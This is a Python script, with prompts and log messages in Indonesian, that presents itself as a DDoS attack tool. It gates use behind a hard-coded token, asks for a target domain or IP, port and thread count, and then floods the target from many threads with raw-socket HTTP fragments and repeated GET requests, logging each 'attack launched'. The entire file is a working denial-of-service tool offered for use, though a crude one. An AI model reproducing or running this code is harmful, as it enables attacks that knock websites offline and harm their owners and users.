import threading
import socket
import requests
import logging
import os
import subprocess
import sys
from colorama import init, Fore, Style

def install_and_import(package):
    try:
        __import__(package)
        print(f"{Fore.GREEN}Modul '{package}' sudah terpasang.{Style.RESET_ALL}")
    except ImportError:
        print(f"{Fore.YELLOW}Modul '{package}' tidak ditemukan. Mengunduh dan memasang...{Style.RESET_ALL}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"{Fore.GREEN}Modul '{package}' berhasil dipasang.{Style.RESET_ALL}")

install_and_import('colorama')
install_and_import('requests')

init(autoreset=True)

logging.basicConfig(filename='ddos.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

logo = f"""
{Style.BRIGHT}{Fore.MAGENTA}  ____  _          _____  _    _ _____  
 |  _ \| |        / ____|| |  | |  __ \ 
 | |_) | |_ _ __ | |     | |  | |__) |
 |  _ <| __| '_ \| |     | |  |  ___/ 
 | |_) | |_| | | | |____ | |__| | |     
 |____/ \__|_| |_|\_____(_)____/|_|     
{Fore.YELLOW}
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
for Feedback • t.me/damn_boy738
"""

author = f"{Fore.RED}{Style.BRIGHT}Author: Damn Boy 404{Style.RESET_ALL}"

TOKEN = "JgS3nG5PvT9aUkR8zYbE2xQ6fW1oLcX4hDvFmCjKgHnNmZbYnBaWp4sUgYcTdRf"

def authenticate():
    print(logo)
    print(author)
    token = input("Masukkan token otentikasi: ")
    if token == TOKEN:
        return True
    else:
        print("Token otentikasi tidak valid.")
        return False

def ddos(target_ip, target_port, num_threads):
    for _ in range(num_threads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
            
            url = f"http://{target_ip}:{target_port}"
            response = requests.get(url)
            status_code = response.status_code
            response_time = response.elapsed.total_seconds()
            print(f"{Fore.GREEN}[STATUS] Situs: {url}, Kode Status: {status_code}, Waktu Respons: {response_time:.2f} detik")
            logging.info(f"Serangan DDoS ke {url} berhasil diluncurkan")
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")
            logging.error(f"Error: {e}")

def get_ip_from_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Tidak dapat menyelesaikan domain: {e}")
        logging.error(f"Error resolving domain: {e}")
        return None

def login():
    if authenticate():
        os.system('clear')
        print(logo)
        print(author)
        target = input("Masukkan domain atau IP target: ")
        
        if target.replace('.', '').isdigit():
            target_ip = target
        else:
            target_ip = get_ip_from_domain(target)
            if not target_ip:
                print("Resolusi domain gagal. Pastikan domain valid.")
                return

        target_port = int(input("Masukkan port target: "))
        num_threads = int(input("Masukkan jumlah thread untuk serangan DDoS: "))

        if num_threads <= 0:
            print("Jumlah thread harus lebih besar dari 0")
            logging.error("Jumlah thread harus lebih besar dari 0")
            return
        
        for _ in range(num_threads):
            thread = threading.Thread(target=ddos, args=(target_ip, target_port, num_threads))
            thread.start()
        
        print("Serangan DDoS telah berhasil diluncurkan!")
        logging.info("Serangan DDoS berhasil diluncurkan")

if __name__ == '__main__':
    login()